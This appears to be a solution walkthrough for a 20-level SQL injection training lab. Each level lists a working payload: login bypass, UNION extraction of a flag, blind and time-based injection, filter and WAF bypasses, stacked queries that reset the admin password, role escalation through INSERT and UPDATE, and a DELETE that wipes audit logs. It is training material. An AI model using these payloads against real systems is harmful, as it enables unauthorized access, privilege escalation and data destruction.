## Level 1: Login Bypass (String)

Goal: Login as admin without password.
Payload (Username):
```
admin' --
```

Explanation: Turns query into SELECT ... WHERE username='admin' --' AND .... Parts after -- are commented out.

## Level 2: Login Bypass (Integer)

Goal: View hidden/all products.
Payload (ID):
```
1 OR 1=1
```

Explanation: Injection in integer context (no quotes), using OR 1=1 makes the condition always true.

## Level 3: UNION Attack (Visible)

Goal: Get Flag from secrets table.
Payload (Search):
```
' UNION SELECT id, flag, 1 FROM secrets--
```

Explanation: Appends results from secrets table to the current search results.

## Level 4: Error Based

Goal: Force database to print syntax error.
Payload:
```
1'
```

Explanation: Extra single quote causes SQL syntax error, confirming vulnerability.

## Level 5: Boolean Blind

Goal: Determine data based on True/False (Found/Not Found) response.
Payload (True):
```
admin' AND 1=1--
```

Payload (False):

admin' AND 1=0--


## Level 6: Time Based Blind

Goal: Delay server response (Database Sleep).
Payload:
```
' OR sleep(3)--
```

Explanation: Uses sleep() function (injected via python into SQLite) to delay 3 seconds.

## Level 7: Filter Bypass (Space)

Goal: Bypass Space character filter.
Payload:
```
1/**/UNION/**/SELECT/**/flag,1,1/**/FROM/**/secrets
```

Explanation: Uses SQL comments /**/ instead of spaces.

## Level 8: Second Order SQLi

Goal: Privilege escalation via 2 steps.
Step 1 (Register): Register a username containing payload.
```
admin' --
```

Step 2 (View Profile): Admin views the new user's profile. The payload is retrieved from DB and executes a new query: SELECT role FROM users WHERE username = 'admin' --'.

## Level 9: WAF Bypass (Keywords)

Goal: Bypass "UNION SELECT" filter.
Payload:
```
' UNION/**/SELECT id, flag, 1 FROM secrets--
```

Explanation: Insert comments between UNION and SELECT to break the WAF signature.

## Level 10: Stacked Queries

Goal: Change Admin Password (UPDATE statement).
Payload:
```
1; UPDATE users SET password='pwned' WHERE username='admin';--
```

> Explanation: Uses semicolon ; to execute a second SQL statement (UPDATE).

## Level 11: Column Picker (SELECT List Injection)

Goal: Expose hidden flag by injecting into the SELECT column list.
Payload (cols):
```
name, (SELECT flag FROM secrets)
```

Explanation: The injected subquery becomes a visible column in the result set.

## Level 12: Ranking Engine (Expression Injection)

Goal: Leak secret data via computed column.
Payload (rank):
```
(SELECT flag FROM secrets)
```

Explanation: The injected expression is evaluated as the ranking score and rendered on screen.

## Level 13: Batch Selector (IN Clause Injection)

Goal: UNION into the IN clause to reveal the flag.
Payload (ids):
```
1) UNION SELECT id, flag, 1 FROM secrets--
```

Explanation: Closes the IN list and appends a UNION SELECT.

## Level 14: Wildcard Escape (ESCAPE Clause Injection)

Goal: Inject via the ESCAPE parameter.
Payload (esc):
```
x' OR 1=1 UNION SELECT flag, flag FROM secrets--
```

Explanation: Breaks out of the ESCAPE literal and unions the secrets table.

## Level 15: Profile Update (UPDATE Injection)

Goal: Escalate user role to admin by injecting into SET clause.
Payload (status):
```
ok', role='admin
```

Explanation: Adds a new assignment to the UPDATE statement.

## Level 16: Signup Service (INSERT Injection)

Goal: Create a new admin account during signup.
Payload (username):
```
hacker', 'pw', 'admin', 'active')--
```

Explanation: Closes the VALUES list early and injects admin role values.

## Level 17: Audit Cleanup (DELETE Injection)

Goal: Wipe all audit logs.
Payload (log_id):
```
1 OR 1=1
```

Explanation: Deletes every row by forcing the WHERE clause to always be true.

## Level 18: Nested Query (Subquery Injection)

Goal: Expose the flag from inside a nested SELECT.
Payload (ref):
```
' UNION SELECT flag FROM secrets--
```

Explanation: The injected UNION runs inside the subquery and returns the flag.

## Level 19: Encoded Filter (Base64 Bypass)

Goal: Bypass keyword filter by sending Base64-encoded payload.
Decoded payload:
```
%' UNION SELECT id, flag, 1 FROM secrets--
```
Base64:
```
JScgVU5JT04gU0VMRUNUIGlkLCBmbGFnLCAxIEZST00gc2VjcmV0cy0t
```

Explanation: The app blocks raw keywords but decodes and executes the payload.

## Level 20: Report Builder (Script Injection)

Goal: Modify system state via the report filter.
Payload (filter):
```
1=1; UPDATE users SET password='pwned_report' WHERE username='admin';--
```

Explanation: The report builder uses executescript(), allowing stacked statements.
